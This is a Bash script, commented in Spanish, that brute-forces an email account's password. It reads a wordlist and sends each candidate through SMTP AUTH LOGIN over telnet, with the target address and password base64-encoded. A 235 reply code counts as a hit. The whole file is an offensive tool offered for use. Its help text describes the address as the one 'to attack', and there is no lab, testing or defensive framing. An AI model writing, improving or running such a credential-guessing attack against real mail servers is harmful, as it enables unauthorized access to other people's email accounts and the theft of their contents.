#!/bin/bash

# Email-Bruteforce: Herramienta básica de fuerza bruta para correo electrónico
# Autor: JohansitoDev

EMAIL_ADDRESS=""
SMTP_SERVER=""
SMTP_PORT="25"  
WORDLIST_FILE=""

function show_help() {
    echo "Uso: $0 -e <email_objetivo> -s <servidor_smtp> -w <wordlist_contraseñas>"
    echo ""
    echo "Opciones:"
    echo "  -e  Dirección de correo electrónico a atacar (ej: objetivo@dominio.com)"
    echo "  -s  Servidor SMTP del dominio (ej: smtp.dominio.com)"
    echo "  -p  Puerto SMTP (por defecto: 25)"
    echo "  -w  Ruta al archivo de wordlist de contraseñas"
    echo "  -h  Mostrar esta ayuda"
    exit 1
}

function check_dependencies() {
    if ! command -v telnet &> /dev/null; then
        echo "Error: La herramienta 'telnet' no está instalada. Por favor, instálala."
        exit 1
    fi
}

function test_credentials() {
    local email=$1
    local password=$2
    local server=$3
    local port=$4

    echo "Intentando: $email | $password"
    telnet_output=$(
        {
            sleep 1
            echo "EHLO test.com"
            sleep 1
            echo "AUTH LOGIN"
            sleep 1
            echo "$(echo -n "$email" | base64)"
            sleep 1
            echo "$(echo -n "$password" | base64)"
            sleep 1
            echo "QUIT"
            sleep 1
        } | telnet "$server" "$port" 2>/dev/null
    )

   
    if echo "$telnet_output" | grep -q "235"; then
        echo "  [ÉXITO] Credenciales encontradas: $email | $password"
        exit 0
    elif echo "$telnet_output" | grep -q "535"; then
        echo "  [FALLO] Contraseña incorrecta."
    else
        echo "  [INFO] No se pudo autenticar. Código de respuesta desconocido."
    fi
}

check_dependencies

while getopts "e:s:p:w:h" opt; do
    case "$opt" in
        e) EMAIL_ADDRESS="$OPTARG";;
        s) SMTP_SERVER="$OPTARG";;
        p) SMTP_PORT="$OPTARG";;
        w) WORDLIST_FILE="$OPTARG";;
        h) show_help;;
        *) show_help;;
    esac
done

if [[ -z "$EMAIL_ADDRESS" || -z "$SMTP_SERVER" || -z "$WORDLIST_FILE" ]]; then
    show_help
fi

echo "Iniciando Email-Bruteforce contra $EMAIL_ADDRESS en $SMTP_SERVER:$SMTP_PORT"
echo "------------------------------------------------------------------"

if [ ! -f "$WORDLIST_FILE" ]; then
    echo "Error: El archivo de wordlist no se encuentra."
    exit 1
fi

while read -r password; do
    test_credentials "$EMAIL_ADDRESS" "$password" "$SMTP_SERVER" "$SMTP_PORT"
done < "$WORDLIST_FILE"

echo ""
echo "------------------------------------------------------------------"
echo "Email-Bruteforce ha finalizado."
echo "No se encontraron contraseñas en la wordlist proporcionada."
